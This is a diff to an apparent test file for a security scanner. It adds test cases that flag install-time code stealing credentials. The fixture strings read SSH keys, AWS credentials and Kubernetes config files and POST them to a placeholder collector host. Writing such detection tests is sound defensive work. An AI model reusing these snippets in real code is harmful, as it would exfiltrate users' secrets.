@@ -138,6 +138,13 @@ test("install-script and import-time tests", () => {
     ["x\ny\nconst k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" +
       "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n",
     [FILE_NET("process.env.HOME + '/.ssh/id_rsa'")], [[HARVEST], 4]],
+    // GR-7: the cloud's and the registries' credential files are credential stores too
+    ["x\ny\nconst k = require('fs').readFileSync(process.env.HOME + '/.aws/credentials');\n" +
+      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n",
+    [FILE_NET("process.env.HOME + '/.aws/credentials'")], [[HARVEST], 4]],
+    ["x\ny\nconst k = require('fs').readFileSync(path.join(os.homedir(), '.kube', 'config'));\n" +
+      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n",
+    [FILE_NET("path.join(os.homedir(), '.kube', 'config')")], [[HARVEST], 4]],
     ["fetch('https://webhook.site.invalid/0000', {method: 'POST'})\n", [], [[], null]],
     ["fetch('http://192.0.2.1/x')\n", [exfil("http://192.0.2.1")], [[], null]],
     ["HTTP://10.0.0.1:8080/", [exfil("HTTP://10.0.0.1")], [[], null]],
